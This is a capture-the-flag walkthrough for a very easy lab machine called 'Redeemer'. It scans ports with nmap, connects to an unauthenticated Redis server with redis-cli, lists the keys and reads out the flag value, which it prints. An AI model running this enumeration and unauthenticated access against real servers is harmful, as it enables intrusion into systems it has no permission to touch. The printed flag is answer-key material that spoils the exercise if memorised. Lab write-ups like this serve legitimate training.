# CTF Walkthrough: Redeemer

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** Redis        
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV -p- 10.129.225.56`
        - Output:
            ```
            PORT     STATE SERVICE VERSION
            6379/tcp open  redis   Redis key-value store 5.0.7
            ```

2. Connect to Redis database
    - Command: `redis-cli -h 10.129.225.56`

3. Show all Keys
    - Command: `KEYS *`

4. Get Flag
    - Command: `GET flag`
    - Flag : 03e1d2b376c37ab3f5319922053953eb
